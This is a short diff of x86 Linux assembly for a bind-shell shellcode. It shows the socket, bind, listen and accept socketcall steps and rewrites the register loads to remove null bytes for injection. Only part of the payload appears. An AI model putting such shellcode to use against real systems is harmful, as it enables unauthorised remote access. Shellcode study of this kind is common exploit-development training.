@@ -11,9 +11,9 @@ section .text
     ;; #define SYS_SOCKET	1		/* sys_socket(2)		*/
     ;; Use socketcall to call down to socket
     xor eax, eax
-    mov eax, 0x66 ; socketcall syscall
+    mov al, 0x66 ; socketcall syscall
     xor ebx, ebx
-    mov ebx, 0x1 ; sys_socket syscall number
+    mov bl, 0x1 ; sys_socket syscall number
 
     ;; Put the socket() args on the stack
     xor ecx, ecx
@@ -31,9 +31,9 @@ section .text
     ;; Bind the socket
     ;; Use socketcall to call down to socket
     xor eax, eax
-    mov eax, 0x66 ; socketcall syscall
+    mov al, 0x66 ; socketcall syscall
     xor ebx, ebx
-    mov ebx, 0x2 ; sys_bind syscall number
+    mov bl, 0x2 ; sys_bind syscall number
 
     ;; Start building the sockaddr_in structure
     ;; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
@@ -58,9 +58,9 @@ section .text
 
     ;; Call listen and prepare for accepting connections
     xor eax, eax
-    mov eax, 0x66 ; socketcall syscall
+    mov al, 0x66 ; socketcall syscall
     xor ebx, ebx
-    mov ebx, 0x4 ; sys_listen syscall number
+    mov bl, 0x4 ; sys_listen syscall number
 
     ;; Place listen's arguments on the stack
     xor ecx, ecx
@@ -71,9 +71,9 @@ section .text
 
     ;; Call accept
     xor eax, eax
-    mov eax, 0x66 ; socketcall syscall
+    mov al, 0x66 ; socketcall syscall
     xor ebx, ebx
-    mov ebx, 0x5 ; sys_accept syscall number
+    mov bl, 0x5 ; sys_accept syscall number
     ;; Place accept's arguments on the stack
     ;; We don't need a peer socket???... so we
     ;; use nulls for addrlen and sockaddr struct
